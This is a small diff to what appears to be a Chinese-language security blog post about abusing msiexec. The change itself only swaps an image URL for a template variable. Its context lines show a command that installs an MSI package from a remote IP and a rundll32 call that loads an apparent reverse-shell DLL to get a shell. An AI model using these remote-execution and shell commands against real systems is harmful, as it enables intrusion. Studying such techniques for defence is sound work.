@@ -82,7 +82,7 @@ bmsiexec /i http://192.168.220.125/white_process/test.msi
 
 后面逆向了一下 32位版的 msiexec.exe, 也通过 `rundll32 Msiexec_rev_x64_4444.dll DllEntryPoint` 成功 get shell 证实了这一结论
 
-![msiexec_re_register_dll](https://blog.idevin.cn/assets/img/Msiexec_DllRegisterServer.png)
+![msiexec_re_register_dll]({{site.url}}/assets/img/Msiexec_DllRegisterServer.png)
 
 ## Reference
 
